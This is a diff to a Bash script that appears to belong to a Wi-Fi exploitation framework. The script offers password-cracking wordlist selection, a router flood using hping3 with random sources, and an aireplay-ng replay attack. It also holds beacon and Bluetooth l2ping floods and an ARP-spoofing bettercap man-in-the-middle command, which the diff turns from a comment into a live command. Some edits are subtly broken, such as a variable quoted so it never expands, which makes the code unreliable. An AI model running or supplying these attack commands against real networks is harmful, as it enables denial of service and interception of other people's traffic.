@@ -318,19 +318,19 @@ function ask_dict(){
 	echo -e "\t${blueColour}[${endColour}${yellowColour}3${endColour}${blueColour}] darkweb2017-top10000.txt${endColour}"
 	echo -ne "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Please, select a wordlist to use: ${endColour}" && read dic_option
 
-	if [ "$dic_option" == "1" ]; then
+	if [ "$dic_option" == "1" ] || [ "$dic_option" == "rockyou" ] || [ "$dic_option" == "rockyou.txt" ]; then
 		wordlist_to_use="/opt/WEF/main//wordlists/rockyou.txt"
 	fi
 
-	if [ "$dic_option" == "2" ]; then
+	if [ "$dic_option" == "2" ] || [ "$dic_option" == "probable" ] || [ "$dic_option" == "probable-v2-wpa-top4800.txt" ]; then
 		wordlist_to_use="/opt/WEF/main/wordlists/probable-v2-wpa-top4800.txt"
 	fi
 
-	if [ "$dic_option" == "3" ]; then
+	if [ "$dic_option" == "3" ] || [ "$dic_option" == "darkweb" ] || [ "$dic_option" == "darkweb2017-top10000.txt" ]; then
 		wordlist_to_use="/opt/WEF/main/wordlists/darkweb2017-top10000.txt"
 	fi
 
-	if [ "$dic_option" == "kaonashi" ]; then
+	if [ "$dic_option" == "4" ] || [ "$dic_option" == "kaonashi" ] || [ "$dic_option" == "kaonashi.txt" ]; then
 		wordlist_to_use="/opt/WEF/main/wordlists/kaonashi.txt"
 	fi
 }
@@ -379,7 +379,7 @@ function rainbow-gen(){
 
 # Report Generate Function
 function report-gen(){
-	touch /opt/WEF/main/logs/$name.log
+	touch /opt/WEF/main/logs/$name.log 2>/dev/null
 
 	if [ ! "$name" ]; then
 		name="Not especified"
@@ -582,7 +582,7 @@ function beacon_flood(){
 	kill -9 $air_PID
 	wait $air_PID 2>/dev/null
 
-	sleep 0.3
+	sleep 0.1
 	actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
 	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting Beacon Flood attack...${endColour}"
 	sleep 0.3
@@ -677,9 +677,10 @@ function slow_router(){
 		router_ip="192.168.1.1"
 	fi
 
+	ask_time
 	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Floading the router connection...${endColour}"
-	hping3 --rand-source -V -d 500 $router_ip -p 80 --flood 2>/dev/null
-	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Router Floaing completed${endColour}"
+	timeout "${sleep_time}" bash -c 'hping3 --rand-source -V -d 500 $router_ip -p 80 --flood 2>/dev/null'
+	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Router Floading completed${endColour}"
 	sleep 1
 	keep_exit
 }
@@ -706,7 +707,7 @@ function michael(){
 	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Logs stored in: /opt/WEF/main/logs/$name.log ${endColour}"
 	sleep 0.1
 	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attacked completed${endColour}"
-	sleep 1.5
+	sleep 1
 	keep_exit
 }
 
@@ -734,8 +735,8 @@ function pixie_dust(){
 	report-gen
 	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Logs stored in: /opt/WEF/main/logs/$name.log ${endColour}"
 	sleep 0.1
-	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attacked completed${endColour}"
-	sleep 1.5
+	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attack completed${endColour}"
+	sleep 1
 	keep_exit
 }
 
@@ -784,10 +785,10 @@ function replay(){
 
 	sleep 0.1
 	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting replay attack...${endColour}"
-	sleep 2.5
+	sleep 2
 	xterm -hold -e "airodump-ng -c $channel -w ${dir}/Capture --essid $name ${netCard}mon"
 	air2_PID=$!
-	sleep 0.5
+	sleep 0.3
 
 	timeout ${attack_time} bash -c "aireplay-ng -3 -b ${ap_mac} ${netCard}mon 2>/dev/null"
 
@@ -797,8 +798,8 @@ function replay(){
 	sleep 0.3
 	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Logs stored in: /opt/WEF/main/logs/$name.log ${endColour}"
 	sleep 0.1
-	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attacked completed${endColour}"
-	sleep 1.5
+	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attack completed${endColour}"
+	sleep 1
 	keep_exit
 }
 
@@ -820,18 +821,18 @@ function scan(){
 function image_changer(){
 	clear
 	sleep 0.1
-	echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Do you to scan the network? [${endColour}${yellowColour}y${endColour}${blueColour}/${endColour}${yellowColour}n${endColour}${blueColour}]: ${endColour}" && read option
+	echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Do you want to scan the network? [${endColour}${yellowColour}y${endColour}${blueColour}/${endColour}${yellowColour}n${endColour}${blueColour}]: ${endColour}" && read option
 	if [ "$option" == "y" ]; then
 		scan
 	fi
 	echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Enter the target ip: ${endColour}" && read target_ip
 	cp /opt/WEF/main/modules/replace_images.rb .
 
-	# bettercap -I ${interface} -O bettercap_proxy.log -S ARP -X --proxy --proxy-module replace_images --httpd --httpd-path img --gateway 192.168.0.1 --target 192.168.0.7
+	bettercap -I ${netCard}mon -O bettercap_proxy.log -S ARP -X --proxy --proxy-module replace_images --httpd --httpd-path /opt/WEF/main/img --gateway 192.168.1.1 --target ${target_ip}
 
 	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attack Completed${endColour}"
 	rm ${dir}/replace_images.rb 2>/dev/null
-	sleep 1.5
+	sleep 1
 	keep_exit
 }
 
@@ -849,8 +850,8 @@ function exec_commands(){
 			echo -e "${endColour}"
 		else
 			tput civis
+			sleep 0.1
 			break
-			sleep 0.3
 		fi
 	done
 }
@@ -886,7 +887,7 @@ function blue-deauth(){
 	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] MAC address of the target: ${endColour}" && read mac_to_deauth
 	sleep 0.1
 	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting attack...${endColour}"
-	l2ping -i "$blue-interface" -s $packets_size -f $mac_to_deauth
+	l2ping -i "${blue-interface}" -s $packets_size -f $mac_to_deauth
 }
 
 # Secret
